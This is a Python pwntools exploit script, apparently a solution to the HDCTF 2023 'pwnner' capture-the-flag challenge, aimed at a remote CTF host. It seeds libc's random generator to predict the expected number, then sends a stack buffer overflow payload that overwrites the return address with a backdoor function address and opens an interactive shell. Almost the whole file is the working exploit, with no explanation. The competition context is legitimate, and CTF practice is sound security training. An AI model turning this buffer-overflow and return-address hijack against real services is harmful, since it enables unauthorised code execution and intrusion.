from pwn import *
from LibcSearcher import *

# io = remote("192.168.170.128", 1234)
# context.arch = "amd64"

# p = remote("node4.buuoj.cn", 28576)
io = remote("node5.anna.nssctf.cn", 28532)
# io = process('./find_flag')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
elf = ELF('./pwnner[HDCTF 2023]')


def s(a):
    io.send(a)
def sa(a, b):
    io.sendafter(a, b)
def sl(a):
    io.sendline(a)
def sal(a, b):
    io.sendlineafter(a, b)
def r():
    print(io.recv())
def ru(a):
    return io.recvuntil(a)
def rl():
    io.recvline()
def sla(a, b):
    p.sendlineafter(a, b)
def debug():
    gdb.attach(io)
    pause()
def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
def inter():
    return io.interactive()


# context(os='linux', arch='amd64')
# context(os='linux', arch = 'amd64', log_level = "debug")

back = 0x04008B2

from ctypes import *
libc = cdll.LoadLibrary("libc.so.6")
libc.srand(0x39)
random_num = libc.rand()
print("random_num =", random_num)
ru("name:")

sl(str(random_num))

ru("ok,you have a little cognition about dasctf_sixbytes,so what will you do next?")
sl(b'a' * (0x40 + 8) + p64(back))

inter()
